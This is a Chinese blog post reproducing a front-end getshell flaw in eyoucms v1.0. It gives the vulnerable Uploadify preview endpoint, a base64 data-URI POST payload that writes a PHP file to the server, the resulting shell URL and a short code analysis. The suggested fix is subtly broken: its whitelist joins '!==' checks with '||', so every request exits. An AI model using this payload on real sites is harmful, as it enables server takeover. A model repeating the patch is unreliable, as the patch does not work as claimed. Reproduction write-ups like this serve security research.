---
title: eyoucms v1.0 前台getshell
categories: 漏洞复现
---
# 利用
>http://10.1.2.189/index.php/api/Uploadify/preview

出现

![](https://img-blog.csdnimg.cn/7d8b3ba289314836863357406689972b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
这时 `post` 数据base64 为php代码

>data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==

返回地址：

![](https://img-blog.csdnimg.cn/c0f244b5ccf049e5bcf0e69c0cf3509e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Shell地址：

>http://10.1.2.189/preview/c7a10e2172ba0f171ec45f376fb0601d.php


# 漏洞分析
>\eyou\application\api\controller\Uploadify.php   第174行

![](https://img-blog.csdnimg.cn/3cc5cf6beeb84a9d8157e73bd74e0b01.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
下断点试一下

![](https://img-blog.csdnimg.cn/3f9a9713940a49caaceb5ddbc84568fd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
通过php://input读取数据，然后进行正则，说一下这个$matches

>如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。

![](https://img-blog.csdnimg.cn/696129a042c5482e9a8d3915c18ac60e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
写入并返回文件地址

![](https://img-blog.csdnimg.cn/ab446fd3e7f44554ab5a4a0c5aae15dd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

# 修复
在type处加一个白名单就行

```
if ($type !== 'jpeg' || $type !=='png' || $type !=='gif' || $type!=='jpg') {
       exit();
}
if ($type === 'jpeg') {
        $type = 'jpg';
}
```
